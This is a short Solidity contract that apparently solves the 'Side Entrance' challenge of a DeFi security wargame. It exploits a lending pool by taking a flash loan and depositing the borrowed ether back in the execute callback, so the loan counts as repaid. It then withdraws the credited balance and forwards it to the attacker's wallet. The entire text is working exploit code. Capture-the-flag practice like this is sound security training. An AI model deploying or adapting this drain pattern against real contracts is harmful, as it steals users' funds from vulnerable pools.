import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        //we first get the flashloan (which will deposit the money back into the contract)
        pool.flashLoan(amount);
        //we then withdraw it
        pool.withdraw();
    }

    function execute() external payable {
        // our flshloan will deposit the amt into the flashloan contract
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        //and sent to money to the attack wallet
        owner.transfer(address(this).balance);
    }
}
